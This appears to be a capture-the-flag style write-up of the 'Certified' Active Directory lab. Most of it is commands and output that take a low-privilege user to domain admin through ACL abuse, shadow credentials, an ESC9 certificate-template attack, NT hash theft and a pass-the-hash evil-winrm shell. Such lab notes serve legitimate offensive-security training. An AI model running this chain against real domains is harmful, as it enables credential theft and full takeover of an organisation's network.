## Certified

### Lab Details 

- Difficulty: Medium
- Type: Exploit Mis-Configured ADCS, Active Directory, Windows

#### Enumeration
- we are given username and password `judith.mader:judith09`
- run `nmap`
- attempt `anonymous & authenticated SMB login`
	- unable to login
- run `enum4linux-ng`
	- refer to `enum4linux-ng output` file
- create users.txt
```bash
$ cat users.txt 
judith.mader
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```
- create password file
```bash
$ wget https://github.com/insidetrust/statistically-likely-usernames/raw/refs/heads/master/weak-corporate-passwords/english-basic.txt
$cat users.txt >> english-basic.txt
```
- attempt password brute force
```
$ nxc smb 10.129.103.43 -u users.txt -p english-basic.txt
```
- unable to find a valid password
#### Initial Foothold 
- run `bloodhound-python` against target
![[Reachable High Value Targets.png]]
- load the `json` files to dashboard
- use `Reachable High Value Targets` to look for potential privilege escalation tracks as user `judith`
- we have `WriteOwner` to `Management` group
- the `Management` group has `GenericWrite` over `management_svc` user
- to exploit this first, we will need to add `judith` to the `Management` group
```bash
$ bloodyAD --host "10.129.103.43" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management judith.mader
[+] Old owner S-1-5-21-729746778-2675978091-3820388244-512 is now replaced by judith.mader on management
```
- then give `juidth` the owner permission over the group
```bash
$ python3 /usr/local/bin/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'judith.mader' -target 'management' "certified.htb"/"judith.mader":'judith09'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251003-084352.bak
[*] DACL modified successfully!
```
- add `judith` as a member to the group
```bash
net rpc group addmem "management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S "dc01.certified.htb"
```
- add shadow credential to show the hash of `management_svc` 
```bash
$ certipy shadow auto -username judith.mader@certified.htb -password 'judith09' -account management_svc -dc-ip 10.129.231.186 -target certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'de3ea006-757a-6089-5663-6908e4d12526'
[*] Adding Key Credential with device ID 'de3ea006-757a-6089-5663-6908e4d12526' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID 'de3ea006-757a-6089-5663-6908e4d12526' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Using principal: management_svc@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
```
#### Lateral Movement (If any)
![[Transitive Object Control.png]]
- use the `Transitive Object Control` option on `Judith` in bloodhound
- we can see that `MANAGEMENT_SVC` user has `GenericAll` write over `CA_OPERATOR`
- we can attempt to get `ca_operator`'s hash by adding shadow credential
```bash
$ certipy shadow auto -username "management_svc@certified.htb" -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account "ca_operator" -dc-ip 10.129.231.186 -target certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6c09b2b6-ad14-aa81-9e7d-6fa9025f2b21'
[*] Adding Key Credential with device ID '6c09b2b6-ad14-aa81-9e7d-6fa9025f2b21' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '6c09b2b6-ad14-aa81-9e7d-6fa9025f2b21' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
#### Privilege Escalation
- check if `Active Directory Certificate Service` is running on target
```bash
$ nxc ldap 10.129.231.186 -u 'management_svc' -H a091c1832bcdd4677c28b5a6a1295584 -M adcs
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing VNC protocol database
[*] Initializing WMI protocol database
[*] Initializing FTP protocol database
[*] Initializing RDP protocol database
[*] Copying default configuration file
SMB         10.129.231.186  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.129.231.186  389    DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 
ADCS        10.129.231.186  389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.231.186  389    DC01             Found PKI Enrollment Server: DC01.certified.htb
ADCS        10.129.231.186  389    DC01             Found CN: certified-DC01-CA
```
- since `Active Directory Certificate Service` is running on the target we can see if there is vulnerability using `certipy`
```bash
$ certipy find -u ca_operator -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -dc-ip 10.129.231.186 -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'certified-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'certified-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'certified-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```
- `ESC9` exists on target
- to exploit this, we will need to change the `ca_operator` user's UPN from `ca_operator@certified.htb` to `Administrator`
```bash
$ certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```
- then  after UPN is changed, request a certificate to that UPN
```bash
$ certipy req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```
- then change the `ca_operator` user's UPN back to the original one.
```bash
$ certipy account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```
- authenticate as administrator using the `pfx` file we get the administrator's hash
```bash
$ certipy auth -pfx 'administrator.pfx' -domain 'certified.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
- get reverse shell as admin via `evil-winrm`
```
$ evil-winrm -i 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```
#### Resources

#### Lesson Learned
